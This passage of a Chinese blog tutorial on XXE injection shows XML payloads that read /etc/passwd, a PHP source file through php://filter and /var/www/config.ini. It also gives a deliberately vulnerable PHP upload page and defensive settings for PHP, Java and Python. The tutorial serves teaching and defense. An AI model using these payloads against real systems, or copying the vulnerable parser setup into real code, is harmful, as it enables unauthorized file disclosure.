    &lt;!ENTITY var SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
]&gt;
&lt;root&gt;
    &lt;data&gt;&amp;var;&lt;&#x2F;data&gt;
&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="（3）通过PHP：-过滤器读取"><a href="#（3）通过PHP：-过滤器读取" class="headerlink" title="（3）通过PHP：//过滤器读取"></a>（3）通过PHP：//过滤器读取</h3><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE root[
    &lt;!ELEMENT root (data)&gt;
    &lt;!ELEMENT data (#PCDATA)&gt;
    &lt;!ENTITY var SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;xxe.php&quot;&gt;
]&gt;
&lt;root&gt;
    &lt;data&gt;&amp;var;&lt;&#x2F;data&gt;
&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="（4）xxe注入测试代码"><a href="#（4）xxe注入测试代码" class="headerlink" title="（4）xxe注入测试代码"></a>（4）xxe注入测试代码</h3><p>xxe.php是一个存在XXE注入漏洞的简单页面</p>
<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;html&gt;
    &lt;body&gt;
        &lt;h1&gt;XXE Example&lt;&#x2F;h1&gt;
        &lt;form method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;
            &lt;label for&#x3D;&quot;file&quot;&gt;XML File:&lt;&#x2F;label&gt;
            &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;
            &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Upload&quot;&gt;
        &lt;&#x2F;form&gt;

        &lt;h1&gt;Result&lt;&#x2F;h1&gt;

        &lt;?php
        if( isset($_FILES[&quot;file&quot;]))&#123;
            $doc &#x3D; new DOMDocument();
            $doc-&gt;validateOnParse &#x3D; true;
            $doc-&gt;Load($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);
            $tags &#x3D; $doc-&gt;getElementsByTagName(&quot;data&quot;);
            foreach($tags as $tag) &#123;
                echo &quot;&lt;pre&gt;&quot; . $tag-&gt;nodeValue . &quot;&lt;&#x2F;pre&gt;\n&quot;;
            &#125;
        &#125; else &#123;
            echo &quot;&lt;h3&gt;No file was selected for upload.&lt;&#x2F;h3&gt;&quot;;
        &#125;
        ?&gt;
    &lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="XXE自动化注入检查工具"><a href="#XXE自动化注入检查工具" class="headerlink" title="XXE自动化注入检查工具"></a>XXE自动化注入检查工具</h1><p><a target="_blank" rel="noopener" href="https://github.com/enjoiz/XXEinjector">https://github.com/enjoiz/XXEinjector</a></p>
<h1 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h1><p>1.使用开发语言提供的禁用外部实体的方法</p>
<p>PHP：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>JAVA:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">DocumentBuilderFactory</span> dbf <span class="token operator">=</span><span class="token class-name">DocumentBuilderFactory</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
dbf<span class="token punctuation">.</span><span class="token function">setExpandEntityReferences</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>Python：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree
xmlData <span class="token operator">=</span> etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>xmlSource<span class="token punctuation">,</span>etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>resolve_entities<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>2.过滤用户提交的XML数据</p>
<p>对变量：<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>，或者，SYSTEM和PUBLIC进行过滤</p>
<p>例如，让我们来试着定义一个新的自定义实体“harmless”。</p>
<p><code>&lt;!DOCTYPE results [ &lt;!ENTITY harmless &quot;completely harmless&quot;&gt; ]&gt;</code></p>
<p>现在，包含这个实体定义的XML文档可以在任何允许的地方引用&harmless;实体。</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE results [
	&lt;!ENTITY harmless &quot;completely harmless&quot;&gt;
]&gt;
&lt;results&gt;
	&lt;result&gt;This result is &amp;harmless;&lt;&#x2F;result&gt;
&lt;&#x2F;results&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>XML解析器，例如PHP DOM，在解析这段XML时，会在加载完文档后立即处理这个自定义实体。因此，请求相关文本时，会得到如下的返回：</p>
<p>This result is completely harmless</p>
<p>下面的这个就肯定不是无害的输入：</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE results [
    &lt;!ENTITY harmless SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;config.ini&quot;&gt;
]&gt;
&lt;results&gt;
    &lt;result&gt;&amp;harmless;&lt;&#x2F;result&gt;
&lt;&#x2F;results&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>3.检查所使用的底层xml解析库，默认禁止外部实体的解析<br>4.使用第三方应用代码及时升级补丁<br>5.同时增强对系统的监控，防止此问题被人利用<br>对于PHP,由于simplexml_load_string函数的XML解析问题出在libxml库上,所以加载实体前可以调用这样一个函数</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>以进行防护,对于XMLReader和DOM方式解析,可以参考如下代码:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token comment">// with the XMLReader functionality:</span>
    <span class="token variable">$doc</span> <span class="token operator">=</span> <span class="token class-name static-context">XMLReader</span><span class="token operator">::</span><span class="token function">xml</span><span class="token punctuation">(</span><span class="token variable">$badXml</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'UTF-8'</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NONET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// with the DOM functionality:</span>
    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$badXml</span><span class="token punctuation">,</span><span class="token class-name">LIBXML_DTDLOAD</span><span class="token operator">|</span><span class="token class-name">LIBXML_DTDATTR</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>&lt;wiz_tmp_tag id=&quot;wiz-table-range-border&quot; contenteditable=&quot;false&quot; style=&quot;display: none;&quot;&gt;</code></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
          
            <a href="/tags/security/" rel="tag"><i class="fa fa-tag"></i> security</a>
          
            <a href="/tags/XXE/" rel="tag"><i class="fa fa-tag"></i> XXE</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2021/07/06/qian-tan-xxe-gong-ji/" rel="next" title="浅谈XXE攻击">
                <i class="fa fa-chevron-left"></i> 浅谈XXE攻击
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/blog.png"
                alt="" />
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">36</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">11</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">27</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XML%E4%B8%8EXXE%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">XML与XXE注入基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-XMl%E5%AE%9A%E4%B9%89"><span class="nav-number">1.1.</span> <span class="nav-text">1.XMl定义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-XML%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">2.XML的作用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-XML%E6%A0%BC%E5%BC%8F%E8%AF%B4%E6%98%8E"><span class="nav-number">1.3.</span> <span class="nav-text">3.XML格式说明</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%86%85%E9%83%A8%E5%A3%B0%E6%98%8EDTD"><span class="nav-number">1.3.1.</span> <span class="nav-text">（1）内部声明DTD</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E5%BC%95%E7%94%A8%E5%A4%96%E9%83%A8DTD"><span class="nav-number">1.3.2.</span> <span class="nav-text">（2）引用外部DTD</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%883%EF%BC%89DTD%E7%9A%84%E5%AE%9E%E4%BD%93"><span class="nav-number">1.3.3.</span> <span class="nav-text">（3）DTD的实体</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#l-DTD%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">l DTD的作用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#l-%E5%86%85%E9%83%A8%E5%A3%B0%E6%98%8E%E5%AE%9E%E4%BD%93"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">l 内部声明实体</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#l-%E5%BC%95%E7%94%A8%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="nav-number">1.3.3.3.</span> <span class="nav-text">l 引用外部实体</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%884%EF%BC%89CDATA"><span class="nav-number">1.3.4.</span> <span class="nav-text">（4）CDATA</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-XML%E7%9A%84%E5%AE%9E%E4%BD%93"><span class="nav-number">1.4.</span> <span class="nav-text">4.XML的实体</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%AD%97%E7%AC%A6%E5%AE%9E%E4%BD%93"><span class="nav-number">1.4.1.</span> <span class="nav-text">（1）字符实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E5%91%BD%E5%90%8D%E5%AE%9E%E4%BD%93"><span class="nav-number">1.4.2.</span> <span class="nav-text">（2）命名实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="nav-number">1.4.3.</span> <span class="nav-text">（3）外部实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%884%EF%BC%89%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="nav-number">1.4.4.</span> <span class="nav-text">（4）参数实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%885%EF%BC%89%E5%86%85%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="nav-number">1.4.5.</span> <span class="nav-text">（5）内部实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%886%EF%BC%89%E5%91%BD%E5%90%8D%E5%AE%9E%E4%BD%93-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E5%86%99%E6%B3%95"><span class="nav-number">1.4.6.</span> <span class="nav-text">（6）命名实体+外部实体写法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%887%EF%BC%89%E7%AC%AC%E4%B8%80%E7%A7%8D%E5%91%BD%E5%90%8D%E5%AE%9E%E4%BD%93-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93-%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%E5%86%99%E6%B3%95"><span class="nav-number">1.4.7.</span> <span class="nav-text">（7）第一种命名实体+外部实体+参数实体写法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%888%EF%BC%89%E7%AC%AC%E4%BA%8C%E7%A7%8D%E5%91%BD%E5%90%8D%E5%AE%9E%E4%BD%93-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93-%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%E5%86%99%E6%B3%95"><span class="nav-number">1.4.8.</span> <span class="nav-text">（8）第二种命名实体+外部实体+参数实体写法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-XML%E4%B8%AD%E7%9A%84%E5%8D%8F%E8%AE%AE%E6%94%AF%E6%8C%81"><span class="nav-number">1.5.</span> <span class="nav-text">5.XML中的协议支持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-XXE%E6%B3%A8%E5%85%A5%E5%AE%9A%E4%B9%89"><span class="nav-number">1.6.</span> <span class="nav-text">6.XXE注入定义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.7.</span> <span class="nav-text">7.XXE漏洞原理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XML%E6%B3%A8%E5%85%A5%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">XML注入简单利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">2.1.</span> <span class="nav-text">1.任意文件读取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%8E%A2%E6%B5%8Bsql%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.2.</span> <span class="nav-text">2.探测sql盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91%E5%9C%B0%E5%9D%80"><span class="nav-number">2.3.</span> <span class="nav-text">3.探测内网地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E9%98%B2%E5%BE%A1XML%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="nav-number">2.4.</span> <span class="nav-text">4.防御XML注入攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="nav-number">3.</span> <span class="nav-text">XXE注入攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-XXE%E6%94%BB%E5%87%BB%E6%A6%82%E8%BF%B0"><span class="nav-number">3.1.</span> <span class="nav-text">1.XXE攻击概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E5%9F%BA%E7%A1%80%E7%9A%84XXE%E6%B3%A8%E5%85%A5"><span class="nav-number">3.2.</span> <span class="nav-text">2.基础的XXE注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84XXE%E6%B3%A8%E5%85%A5"><span class="nav-number">3.3.</span> <span class="nav-text">3.基于错误的XXE注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E5%9F%BA%E4%BA%8E%E7%9B%B2%E6%B3%A8%E7%9A%84XXE%E6%B3%A8%E5%85%A5"><span class="nav-number">3.4.</span> <span class="nav-text">4.基于盲注的XXE注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%881%EF%BC%89Blind-XXE%E7%94%A8%E9%80%94"><span class="nav-number">3.4.1.</span> <span class="nav-text">（1）Blind XXE用途</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%883%EF%BC%89Bllind-XXE"><span class="nav-number">3.4.2.</span> <span class="nav-text">（3）Bllind XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#l-%E5%8E%9F%E7%90%86%E8%AF%B4%E6%98%8E"><span class="nav-number">3.4.2.1.</span> <span class="nav-text">l 原理说明</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#l-%E8%AF%BB%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6"><span class="nav-number">3.4.2.2.</span> <span class="nav-text">l 读任意文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#l-Java%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8"><span class="nav-number">3.4.2.3.</span> <span class="nav-text">l Java中的应用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%884%EF%BC%89%E6%B5%8B%E8%AF%95"><span class="nav-number">3.4.3.</span> <span class="nav-text">（4）测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%885%EF%BC%89%E6%80%BB%E7%BB%93"><span class="nav-number">3.4.4.</span> <span class="nav-text">（5）总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-XXE%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A4%96%E9%83%A8%E5%BC%95%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="nav-number">3.5.</span> <span class="nav-text">5.XXE的几种外部引入方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E6%81%B6%E6%84%8F%E5%BC%95%E5%85%A5%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%96%B9%E5%BC%8F%E4%B8%80"><span class="nav-number">3.5.1.</span> <span class="nav-text">（1）恶意引入外部实体方式一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%81%B6%E6%84%8F%E5%BC%95%E5%85%A5%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%96%B9%E5%BC%8F%E4%BA%8C"><span class="nav-number">3.5.2.</span> <span class="nav-text">（2）恶意引入外部实体方式二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E6%81%B6%E6%84%8F%E5%BC%95%E5%85%A5%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%96%B9%E5%BC%8F%E4%B8%89"><span class="nav-number">3.5.3.</span> <span class="nav-text">（3）恶意引入外部实体方式三</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">XXE攻击利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-1"><span class="nav-number">4.1.</span> <span class="nav-text">1.任意文件读取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B"><span class="nav-number">4.2.</span> <span class="nav-text">2.内网信息探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-DOS%E6%94%BB%E5%87%BB"><span class="nav-number">4.3.</span> <span class="nav-text">3.DOS攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">4.4.</span> <span class="nav-text">4.远程命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E7%BD%91%E7%AB%99"><span class="nav-number">4.5.</span> <span class="nav-text">5.攻击内网网站</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%88%86%E7%B1%BB"><span class="nav-number">5.</span> <span class="nav-text">攻击分类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB-DDoS"><span class="nav-number">5.1.</span> <span class="nav-text">1.拒绝服务攻击(DDoS)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E5%9F%BA%E6%9C%AC%E7%9A%84-XXE-%E6%94%BB%E5%87%BB"><span class="nav-number">5.2.</span> <span class="nav-text">2.基本的 XXE 攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E9%AB%98%E7%BA%A7%E7%9A%84-XXE-%E6%94%BB%E5%87%BB-%E2%80%93-%E7%9B%B4%E6%8E%A5%E5%8F%8D%E9%A6%88%E9%80%9A%E9%81%93"><span class="nav-number">5.3.</span> <span class="nav-text">3.高级的 XXE 攻击 – 直接反馈通道</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E9%AB%98%E7%BA%A7%E7%9A%84-XXE-%E6%94%BB%E5%87%BB-%E2%80%94-%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE-OOB-%E9%80%9A%E9%81%93"><span class="nav-number">5.4.</span> <span class="nav-text">4.高级的 XXE 攻击 — 外带数据(OOB)通道</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-SSRF-%E6%94%BB%E5%87%BB"><span class="nav-number">5.5.</span> <span class="nav-text">5.SSRF 攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-XInclude"><span class="nav-number">5.6.</span> <span class="nav-text">6.XInclude</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-XSLT-%E6%94%BB%E5%87%BB"><span class="nav-number">5.7.</span> <span class="nav-text">7.XSLT 攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE%E6%B3%A8%E5%85%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF"><span class="nav-number">6.</span> <span class="nav-text">XXE注入的几种姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E8%83%BD%E5%A4%9F%E7%9B%B4%E6%8E%A5%E5%9B%9E%E6%98%BE%E7%9A%84"><span class="nav-number">6.1.</span> <span class="nav-text">1.能够直接回显的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E4%B8%8D%E8%83%BD%E7%9B%B4%E6%8E%A5%E5%9B%9E%E6%98%BE%E7%9A%84%EF%BC%8CBlind-XXE"><span class="nav-number">6.2.</span> <span class="nav-text">2.不能直接回显的，Blind XXE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E8%BF%87%E6%BB%A4%E4%BA%86ENTITY%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">6.3.</span> <span class="nav-text">3.过滤了ENTITY关键字</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB"><span class="nav-number">6.4.</span> <span class="nav-text">4.拒绝服务攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE%E6%B3%A8%E5%85%A5%E7%9A%84tips"><span class="nav-number">7.</span> <span class="nav-text">XXE注入的tips</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="nav-number">8.</span> <span class="nav-text">漏洞危害</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Java%E4%B8%AD%E7%9A%84XXE%E5%88%A9%E7%94%A8"><span class="nav-number">9.</span> <span class="nav-text">Java中的XXE利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="nav-number">9.1.</span> <span class="nav-text">1.漏洞代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-payload"><span class="nav-number">9.2.</span> <span class="nav-text">2.payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%8D%8F%E8%AE%AE%E9%97%AE%E9%A2%98"><span class="nav-number">9.3.</span> <span class="nav-text">3.协议问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81"><span class="nav-number">9.4.</span> <span class="nav-text">4.漏洞修复代码</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E7%8E%AF%E5%A2%83-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88XXE%EF%BC%89"><span class="nav-number">10.</span> <span class="nav-text">PHP环境 XML外部实体注入漏洞（XXE）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE%E7%9A%84%E5%85%B8%E5%9E%8B%E6%A1%88%E4%BE%8B%E4%B8%80"><span class="nav-number">11.</span> <span class="nav-text">XXE的典型案例一</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Google-xxe%E7%9A%84%E8%AF%BB%E5%8F%96%E8%AE%BF%E9%97%AE"><span class="nav-number">11.1.</span> <span class="nav-text">1. Google xxe的读取访问</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Facebook-XXE"><span class="nav-number">11.2.</span> <span 